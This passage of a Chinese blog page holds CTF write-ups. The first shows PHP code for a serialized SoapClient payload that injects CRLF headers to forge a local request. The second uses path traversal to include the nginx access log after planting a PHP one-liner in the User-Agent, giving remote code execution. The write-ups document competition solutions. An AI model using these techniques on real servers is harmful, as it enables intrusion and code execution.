&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; $i &lt; count($arr) - <span class="number">1</span>; $i++) &#123;</span><br><span class="line">        $newstr .= $arr[$i];</span><br><span class="line">        $newstr .= <span class="string">&quot;:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .= $arr[$i];</span><br><span class="line">    <span class="keyword">return</span> $newstr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> HelloWorld_DB();</span><br><span class="line">$a = preg_replace(<span class="string">&quot; /\^\^/&quot;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line">$urlen = urlencode($a);</span><br><span class="line">$urlen = preg_replace(<span class="string">&#x27;/%00/&#x27;</span>, <span class="string">&#x27;%5c%30%30&#x27;</span>, $urlen);</span><br><span class="line">$a = decorate(urldecode($urlen));</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>

<p>但是很奇怪，用这个生成的payload打不通，于是我们来比对看看是哪里出了问题,测试了一下，原来问题出在http头的书写过程中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$target = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">        $post_string = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Cookie: PHPSESSID=abcd&#x27;</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;eki\r\nContent-Type: application/x-www-form-urlencoded\r\n&quot;</span>.join(<span class="string">&quot;\r\n&quot;</span>,$headers).<span class="string">&quot;\r\nContent-Length: &quot;</span>.(<span class="keyword">string</span>)strlen($post_string).<span class="string">&quot;\r\n\r\n&quot;</span>.$post_string,</span><br><span class="line">            <span class="string">&#x27;uri&#x27;</span>      =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $a;</span><br></pre></td></tr></table></figure>

<h2 id="ALL-INFO-YOU-WANT"><a href="#ALL-INFO-YOU-WANT" class="headerlink" title="ALL_INFO_YOU_WANT"></a>ALL_INFO_YOU_WANT</h2><p>这种解法比较签到，是常规思路，这题的定位本来就是个白给的题目，所以就没改掉日志</p>
<p>由 http 回包 header 得知是 NGINX，直接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p>但是因为 url 会被 url 编码，可以把一句话木马写在 User-Agent，另外记得一定要闭合不然 php 执行会出错，包含即可 RCE<br><strong>找flag新语句：通过文件内容找flag</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</span><br></pre></td></tr></table></figure></div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>